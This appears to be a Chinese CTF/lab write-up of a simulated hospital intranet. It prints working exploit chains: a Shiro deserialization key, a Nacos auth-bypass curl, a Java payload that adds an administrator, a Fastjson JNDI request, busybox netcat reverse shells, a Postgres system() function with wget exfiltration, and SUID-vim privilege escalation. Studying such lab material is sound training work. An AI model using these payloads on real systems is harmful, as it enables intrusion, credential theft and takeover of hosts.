
# 信息收集

## TCP

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap --min-rate 10000 -p1-65535 39.99.137.181
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 21:24 CST
Warning: 39.99.137.181 giving up on port because retransmission cap hit (10).
Nmap scan report for 39.99.137.181
Host is up (0.063s latency).
Not shown: 57424 closed tcp ports (reset), 8109 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 53.01 seconds
```
就开放了22和8080，详细识别下8080，并且看看OS

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sV -sC -O -p8080 39.99.137.181
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 21:26 CST
Nmap scan report for 39.99.137.181
Host is up (0.025s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat (language: en)
| http-title: \xE5\x8C\xBB\xE7\x96\x97\xE7\xAE\xA1\xE7\x90\x86\xE5\x90\x8E\xE5\x8F\xB0
|_Requested resource was http://39.99.137.181:8080/login;jsessionid=7D215B0E9FC433A1E7712A81276AB9A2
|_http-trane-info: Problem with XML parsing of /evox/about
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4
OS details: Linux 4.19 - 5.15
Network Distance: 11 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.96 seconds
```

仅此而已了

## UDP

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sU --top-ports 20 39.99.137.181
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 21:24 CST
Nmap scan report for 39.99.137.181
Host is up (0.15s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   open|filtered microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  open|filtered upnp
4500/udp  closed        nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 23.68 seconds
```


<img width="1892" height="950" alt="Image" src="https://github.com/user-attachments/assets/6bee4d1c-0c81-450c-918c-5f3bec60bc89" />


前台有弱密码，不过没什么用处

```text
# Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.

Thu Dec 25 21:28:19 CST 2025

There was an unexpected error (type=Not Found, status=404).

No message available
```
随便改下路由就有经典报错，可以看看有没有什么信息泄露

```bash
┌──(.venv)─(root㉿MJ)-[~/tools/SpringBoot-Scan]
└─# cat urlout.txt
http://39.99.137.181:8080/actuator
http://39.99.137.181:8080/actuator/beans
http://39.99.137.181:8080/actuator/caches
http://39.99.137.181:8080/actuator/conditions
http://39.99.137.181:8080/actuator/configprops
http://39.99.137.181:8080/actuator/health
http://39.99.137.181:8080/actuator/info
http://39.99.137.181:8080/actuator/loggers
http://39.99.137.181:8080/actuator/metrics
http://39.99.137.181:8080/actuator/mappings
http://39.99.137.181:8080/actuator/scheduledtasks
http://39.99.137.181:8080/actuator/threaddump
```
这些了，访问`http://39.99.137.181:8080/actuator/`可以看到heapdump，wget下来找下key

```bash
===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = CBC, key = GAYysgMQhG7/CzIJlVpR2g==, algName = AES

===========================================
```

# WEB

shiro反序列化
直接工具就能找到链子，没什么说的baby难度的外网打点，busybox反弹shell就行

<img width="1003" height="825" alt="Image" src="https://github.com/user-attachments/assets/1645b88b-f190-4159-8bde-6bb6bd2c844a" />

# 提权

```bash
app@web01:/$ find / -perm -4000 2>/dev/null
/usr/bin/vim.basic
/usr/bin/su
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/at
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/stapbpf
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/mount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

vim的suid，提权就很简单了，不过它这里编辑passwd的时候`:wq`没法保存，必须得用`:wq!`不知道什么原因

```bash
app@web01:/$ vim.basic /etc/passwd
app@web01:/$ su toor
Password:
root@web01:/# cat /root/flag/flag01.txt
O))     O))                              O))             O))
O))     O))                          O)  O))             O))
O))     O))   O))     O)))) O) O))     O)O) O)   O))     O))
O)))))) O)) O))  O)) O))    O)  O)) O))  O))   O))  O))  O))
O))     O))O))    O))  O))) O)   O))O))  O))  O))   O))  O))
O))     O)) O))  O))     O))O)) O)) O))  O))  O))   O))  O))
O))     O))   O))    O)) O))O))     O))   O))   O)) O)))O)))
                            O))
flag01: flag{798f3c5b-aabc-4fcc-b7f3-1940e4a6d194}

root@web01:/#
```
上线vshell搭个隧道打内网就行

# 内网

筛一下有用信息

```text
(icmp) Target 172.30.12.6     is alive
(icmp) Target 172.30.12.236   is alive
[*] Icmp alive hosts len is: 3
172.30.12.236:22 open
172.30.12.6:8848 open
172.30.12.6:445 open
172.30.12.6:139 open
172.30.12.6:135 open
172.30.12.236:8009 open
172.30.12.236:8080 open
[*] alive ports len is: 9
start vulscan
[*] NetInfo
[*]172.30.12.6
   [->]Server02
   [->]172.30.12.6
[*] NetBios 172.30.12.6     WORKGROUP\SERVER02
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
[*] WebTitle http://172.30.12.6:8848   code:404 len:431    title:HTTP Status 404 – Not Found
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos
[+] PocScan http://172.30.12.6:8848 poc-yaml-alibaba-nacos-v1-auth-bypass
```

两台主机
```text
172.30.12.6 smb 8848 nacos默认端口 像是windows
172.30.12.236 ssh 8080web 8009后续可以做nmap
```

## 172.30.12.6

fscan进行全端口扫描看看

```bash
172.30.12.6:445 open
172.30.12.6:139 open
172.30.12.6:135 open
172.30.12.6:3389 open
172.30.12.6:8848 open
172.30.12.6:47001 open
172.30.12.6:49664 open
172.30.12.6:49666 open
172.30.12.6:49667 open
172.30.12.6:49665 open
172.30.12.6:49669 open
172.30.12.6:49675 open
172.30.12.6:49679 open
172.30.12.6:49686 open
```

基本确定win了，高端口大概率都是rpc，3389开了个rdp


先前可以看到poc扫描存在认证绕过

```bash
root@web01:~# curl -X POST -H 'User-Agent: Nacos-Server' -d 'username=demo&password=demo' http://172.30.12.6:
8848/nacos/v1/auth/users
{"code":200,"message":"create user ok!","data":null}
```
创建新用户，`demo:demo`，不过这些还不够拿shell

[Nacos漏洞汇总复现 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/428863.html)

这篇文章能搜到有yaml反序列化，其实也就是这个，怎么判断，我只能说尝试，因为反序列化这种，明显特征不多，有可能的都试一下，我尝试了sql以及内存马，不过sql在注入内存马过程中失败，内存马直接打没效果


可以拿到yaml反序列化的payload，不过源码中只是弹个计算器，改成加个新用户，这里有个坑用户的密码不能太简单，不然没法创建

```java
┌──(root㉿MJ)-[/tmp/test/yaml-payload/src/artsploit]
└─# cat AwesomeScriptEngineFactory.java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("net user mj a159753. /add");
            Runtime.getRuntime().exec("net localgroup administrators mj /add");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```



改完重新打包，传到外网主机上防止内网不出网

```bash
┌──(root㉿MJ)-[/tmp/test/yaml-payload]
└─# javac src/artsploit/AwesomeScriptEngineFactory.java

┌──(root㉿MJ)-[/tmp/test/yaml-payload]
└─# jar -cvf yaml-payload.jar -C src/ .
added manifest
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1565) (out= 420)(deflated 73%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1674) (out= 711)(deflated 57%)
```


```bash
root@web01:~# python3 -m http.server 8010
Serving HTTP on 0.0.0.0 port 8010 (http://0.0.0.0:8010/) ...
172.30.12.6 - - [25/Dec/2025 22:12:25] "GET /yaml-payload.jar HTTP/1.1" 200 -
```
这边收到回显就是有洞

xfree连上即可

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# pc xfreerdp3 /v:172.30.12.6 /u:mj /p:a159753.
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
```

还是上线vshell，不过这台机器不出网，在外网主机做个socat到攻击机上的监听端口上线即可

```bash
./socat TCP-LISTEN:2332,fork TCP:ip:port &
```

flag在administrator下

```text
flag02: flag{9fe8b635-c832-40fc-b81d-2cb8d5ddb558}
```



## 172.30.12.236

一样的先扫下全端口，不过这个信息不多

```bash
172.30.12.236:22 open
172.30.12.236:8009 open
172.30.12.236:8080 open
[*] alive ports len is: 3
start vulscan
[*] WebTitle http://172.30.12.236:8080 code:200 len:3964   title:医院后台管理平台
```

仅此而已了

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# pc nmap -p8080,8009 172.30.12.236 -Pn
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 22:24 CST
Nmap scan report for 172.30.12.236 (172.30.12.236)
Host is up.

PORT     STATE    SERVICE
8009/tcp filtered ajp13
8080/tcp filtered http-proxy

Nmap done: 1 IP address (1 host up) scanned in 3.07 seconds
```

nmap具体识别下8009是tomcat的ajp，随便访问个报错的就能得到版本号

`Apache Tomcat/8.5.32`

这个版本的tomcat有文件包含和文件读取漏洞，也正是ajp导致的，拿shell思路可以是文件包含个反弹shell文件执行，但是这里没有上传接口，走不通

```bash
┌──(root㉿MJ)-[/tmp/test/CVE-2020-1938-Tomact-file_include-file_read]
└─# pc python2 read.py -p 8009 172.30.12.236 -f '/WEB-INF/web.xml'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  211.159.175.21:10002  ...  172.30.12.236:8009  ...  OK
Getting resource at ajp13://172.30.12.236:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<web-app>
    <servlet>
        <servlet-name>loginServlet</servlet-name>
        <servlet-class>com.hospital.fastjson.LoginServlet</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>loginServlet</servlet-name>
        <url-pattern>/login</url-pattern>
    </servlet-mapping>
</web-app>
```
可以看到有fastjson可能有反序列化，可以试一下，看其他佬说如果结构不完全，会报错的

<img width="2339" height="1274" alt="Image" src="https://github.com/user-attachments/assets/e053e726-c6a9-40e5-a04b-be1123f4360f" />

拿个域名能收到响应的，所以这机器大概率应该出网，不过测试发现没出，可能是走代理了，或者只出一个端口



```json
{"qwq":{"@type":"java.net.Inet4Address","val":"sj58vtjj.dns.adysec.com"}}
```

<img width="1526" height="274" alt="Image" src="https://github.com/user-attachments/assets/aaedd148-198c-4e5f-ba0b-22472aace569" />


外网web主机运行，服务器开监听

```bash
root@web01:~# java -cp jndi_tool.jar jndi.EvilRMIServer 8888 1099 'busybox nc 211.159.175.21 2333 -e /bin/bash'
[-] rmi_port:8888, socket_port:1099, evilcode: busybox nc ip port -e /bin/bash
[-] current hostname error: web01
[-] please enter new hostname(ip)
> 172.30.12.5
[-] use payload: rmi://172.30.12.5:8888/Object
[-] Creating SocketFactory on port 1099
[-] Creating evil RMI registry on port 8888
[-] waiting target connect RMI SocketFactory ...
```

发包

```text
POST /login HTTP/1.1
Host: 172.30.12.236:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
Content-Length: 73
Origin: http://172.30.12.236:8080
Connection: keep-alive
Referer: http://172.30.12.236:8080/
Cookie: JSESSIONID=E006D0CF817EB74DE4657F587B2FE165
Priority: u=0

{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://172.30.12.5:8888/Object",
        "autoCommit":true
    }
}
```

成功接到shell，可以写个公钥持久化，上线vshell

```bash
root@web01:~# nc -lnvp 2333
Listening on 0.0.0.0 2333
Connection received on 172.30.12.236 38490
bash: cannot set terminal process group (655): Inappropriate ioctl for device
bash: no job control in this shell
root@web03:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```


```text
flag03: flag{84fc82d5-cd67-4570-988b-e22ca6c009ce}
```


## 二层内网

```bash
root@web03:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:03:09:b1 brd ff:ff:ff:ff:ff:ff
    inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0
       valid_lft 1892153747sec preferred_lft 1892153747sec
    inet6 fe80::216:3eff:fe03:9b1/64 scope link
       valid_lft forever preferred_lft forever
3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:16:3e:03:09:09 brd ff:ff:ff:ff:ff:ff
    inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1
       valid_lft forever preferred_lft forever
    inet6 fe80::216:3eff:fe03:909/64 scope link
       valid_lft forever preferred_lft forever
```

双网卡新网段172.30.54.179/24，继续fscan扫描，有用信息如下，全端口扫描也没有更多信息，不过tscan嗦了，工具确实很好，以后经济实力够了一定支持一下
[TideSec/TscanPlus: 一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。](https://github.com/TideSec/TscanPlus)

```text
(icmp) Target 172.30.54.12    is alive
[*] Icmp alive hosts len is: 2
172.30.54.12:22 open
172.30.54.12:5432 open
172.30.54.12:3000 open
[*] alive ports len is: 6
start vulscan
[*] WebTitle http://172.30.54.12:3000  code:302 len:29     title:None 跳转url: http://172.30.54.12:3000/login
[*] WebTitle http://172.30.54.12:3000/login code:200 len:27909  title:Grafana
```

<img width="2006" height="1136" alt="Image" src="https://github.com/user-attachments/assets/d7de6827-7387-4fa6-96ca-46f08f75784b" />




关于Grafana的详解可以去看Data的WP，这里工具直接嗦了

```bash
root@web03:~# ./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000/
2025/12/25 23:41:27 Target vulnerable has plugin [alertlist]
2025/12/25 23:41:27 Got secret_key [SW2YcwTIb9zpOOhoPsMm]
2025/12/25 23:41:27 There are [1] records in data_source table.
2025/12/25 23:41:27 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres]      password[Postgres@123]  database:[postgres]     basic_auth_user:[]      basic_auth_password:[]
2025/12/25 23:41:27 All Done, have nice day!
```

但文件读取没法拿shell的，走sql了

```text
[*] 2025-12-25 23:43:08 - 正在连接...
[*] 2025-12-25 23:43:09 - 连接成功！
[*] 2025-12-25 23:43:09 - 预判服务器类型：linux 服务器版本: 64
[*] 2025-12-25 23:43:09 - PostgreSql 版本：PostgreSQL 8.1.0 on x86_64-unknown-linux-gnu, compiled by GCC gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0
[*] 2025-12-25 23:43:09 - 版本小于 8.2 可直接创建 system 函数

```

不过这个代理设置，临时文件弄不过去，mdut还得改进，手动搞吧

```bash
postgres=# CREATE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAG
E 'C' STRICT;
CREATE FUNCTION

postgres=# select system('busybox wget 172.30.54.179:8000/`id`');
 system
--------
    256
(1 row)


root@web03:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.30.54.12 - - [26/Dec/2025 00:18:08] code 404, message File not found
172.30.54.12 - - [26/Dec/2025 00:18:08] "GET /uid=112(postgres) HTTP/1.1" 404 -
```

能够接到响应，弹shell即可，它这个有点不稳定，直接一个反弹shell把服务打崩了，

[psql | GTFOBins](https://gtfobins.github.io/gtfobins/psql/)

```bash
psql
\?
!/bin/sh
```
提权即可

```bash
flag04: flag{8ef1d030-83ed-40c2-a512-6e92838b6f7a}
```



